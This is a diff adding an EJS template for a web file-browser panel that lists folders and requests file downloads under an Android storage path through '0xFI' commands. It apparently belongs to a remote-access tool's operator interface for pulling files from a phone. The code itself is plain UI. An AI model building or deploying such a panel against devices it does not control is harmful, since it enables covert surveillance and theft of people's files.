@@ -1,0 +1,150 @@
+<div class="ui segment">
+    <!-- Breadcrumb untuk navigasi -->
+    <div class="ui breadcrumb" id="path-breadcrumb">
+        <a class="section" onclick="openDirectory(this, '/storage/emulated/0')">
+            <i class="home icon"></i>Root
+        </a>
+        <div class="divider"> / </div>
+        <div class="active section">Current Directory</div>
+    </div>
+
+    <!-- Menu bar dengan fitur tambahan -->
+    <div class="ui secondary menu" style="margin-top: 1em;">
+        <div class="left menu">
+            <div class="ui icon input">
+                <input type="text" placeholder="Search files...">
+                <i class="search icon"></i>
+            </div>
+        </div>
+        <div class="right menu">
+            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui labeled icon button">
+                <i class="home icon"></i>
+                Home
+            </button>
+        </div>
+    </div>
+
+    <!-- File list dengan desain yang lebih modern -->
+    <table class="ui selectable celled table">
+        <thead>
+            <tr>
+                <th class="three wide">Name</th>
+                <th class="nine wide">Path</th>
+                <th class="two wide">Type</th>
+                <th class="two wide">Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% pageData.forEach((item) => { %>
+            <tr class="<%= item.isDir ? 'folder-row' : 'file-row' %>">
+                <td>
+                    <i class="<%= item.isDir ? 'folder outline' : 'file outline' %> icon"></i>
+                    <%= item.name %>
+                </td>
+                <td class="path-cell" title="<%= item.path %>">
+                    <%= item.path %>
+                </td>
+                <td>
+                    <%= item.isDir ? 'Folder' : 'File' %>
+                </td>
+                <td class="center aligned">
+                    <% if(!item.isDir) { %>
+                    <button class="ui compact icon button dlop" onclick="downloadFile(this, '<%= item.path %>')" 
+                            data-tooltip="Download File" data-position="top center">
+                        <i class="download icon"></i>
+                    </button>
+                    <% } else { %>
+                    <button class="ui compact icon button dlop" onclick="openDirectory(this, '<%= item.path %>')"
+                            data-tooltip="Open Folder" data-position="top center">
+                        <i class="folder open icon"></i>
+                    </button>
+                    <% } %>
+                </td>
+            </tr>
+            <% }) %>
+        </tbody>
+    </table>
+
+    <style>
+        .path-cell {
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 300px;
+        }
+        .folder-row:hover {
+            background-color: #f8f9fa !important;
+            cursor: pointer;
+        }
+        .ui.breadcrumb {
+            padding: 1em;
+            background: #f8f9fa;
+            border-radius: 4px;
+        }
+        .ui.table {
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+    </style>
+
+    <script>
+        function openDirectory(element, path) {
+            let button = $(element);
+            button.children().css("opacity", "0");
+            button.addClass('loading');
+            $('.dlop').addClass('disabled');
+            
+            sendCommand('0xFI', {
+                action: 'ls',
+                path
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error);
+                        button.children().css("opacity", "1");
+                        button.removeClass('loading');
+                        $('.dlop').removeClass('disabled');
+                    }, 300);
+                } else if (message === 'Requested') {
+                    showNotification('#2ecc71', 'Requesting Files, Please Wait');
+                    setTimeout(() => {
+                        location.reload();
+                    }, 500);
+                }
+            });
+        }
+
+        function downloadFile(element, path) {
+            let button = $(element);
+            button.children().css("opacity", "0");
+            button.addClass('loading');
+            $('.dlop').addClass('disabled');
+
+            sendCommand('0xFI', {
+                action: 'dl',
+                path
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error);
+                        button.children().css("opacity", "1");
+                        button.removeClass('loading');
+                        $('.dlop').removeClass('disabled');
+                    }, 300);
+                } else if (message === 'Requested') {
+                    setTimeout(() => {
+                        button.children().css("opacity", "1");
+                        button.removeClass('loading');
+                        $('.dlop').removeClass('disabled');
+                        showNotification('#2ecc71', 'Downloading File, It will be available in `Downloads` Soon');
+                    }, 300);
+                }
+            });
+        }
+
+        // Initialize tooltips
+        $(document).ready(function() {
+            $('.ui.button[data-tooltip]').popup();
+        });
+    </script>
+</div>
